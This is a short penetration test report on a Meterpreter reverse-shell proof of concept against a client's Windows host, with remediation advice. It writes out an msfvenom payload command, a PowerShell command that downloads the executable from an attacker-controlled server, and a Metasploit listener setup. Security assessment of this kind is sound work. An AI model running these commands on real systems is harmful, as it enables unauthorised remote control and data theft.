# Penetration Test Report – Payload Delivery & Reverse Shell

**Client:** StructureReality Corp.  
**Date:** September 2025  
**Tester:** Alison T. Richardson  

---

## 📊 Executive Summary
During the assessment, a proof-of-concept attack demonstrated that it was possible to generate a malicious executable, deliver it to a domain system, and obtain a full **Meterpreter reverse shell**.  
This exercise confirmed that **endpoint defenses, application whitelisting, and user restrictions** were insufficient to prevent execution of unauthorized binaries.  

The risk associated with this finding is **Critical**, as attackers could use the same vector to gain persistent access and exfiltrate sensitive data.

---

## 🎯 Objectives
- Generate a **Meterpreter payload** using msfvenom.  
- Deliver the payload to the target system via hosted web server.  
- Download and execute the payload using **PowerShell**.  
- Receive a reverse connection in Metasploit and establish full control.  

---

## 🛠 Technical Details

### 1. Payload Creation
A Windows PE (Portable Executable) was generated using `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o meterpreter_payload.exe
```

**Impact:** Demonstrates the ability to craft malicious executables undetected by the target host at the time of testing.

---

### 2. Hosting & Delivery
A temporary Python web server was launched to host the payload:

```bash
python3 -m http.server 8080
```

From the compromised shell, the following command was executed to download the file:

```powershell
powershell -c "Invoke-WebRequest -Uri http://<attacker-ip>:8080/meterpreter_payload.exe -OutFile C:\Users\Public\meterpreter.exe"
```

**Impact:** Shows that outbound HTTP requests were permitted and no content filtering prevented malicious file delivery.

---

### 3. Listener & Execution
A Metasploit handler was configured:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run
```

The payload was executed on the target:

```powershell
C:\Users\Public\meterpreter.exe
```

**Result:** A **reverse Meterpreter shell** was successfully established, granting remote control over the system.

---

## ⚠️ Risk Assessment
- **Likelihood:** High – attack leveraged widely available tools (Metasploit, msfvenom, PowerShell).  
- **Impact:** Critical – full system compromise and remote control achieved.  
- **Risk Rating:** 🔴 Critical  

---

## 🔒 Recommendations
1. **Application Whitelisting (AppLocker / WDAC):** Restrict execution of unsigned or unapproved executables.  
2. **PowerShell Constrained Language Mode:** Limit PowerShell functionality to reduce abuse.  
3. **Endpoint Detection & Response (EDR):** Deploy solutions that monitor and block suspicious payload execution.  
4. **Network Controls:** Block outbound HTTP/HTTPS connections to untrusted sources.  
5. **User Awareness Training:** Train employees on phishing and malicious download risks.  

---

## ✅ Conclusion
This test confirmed that an attacker could:  
1. Deliver a malicious executable,  
2. Execute it on a target system,  
3. Establish persistent remote control.  

Mitigation efforts should focus on **hardening endpoints**, **monitoring PowerShell activity**, and **restricting unauthorized downloads/executables**.

---

*Prepared by Alison T. Richardson – Cybersecurity Pentest Report*
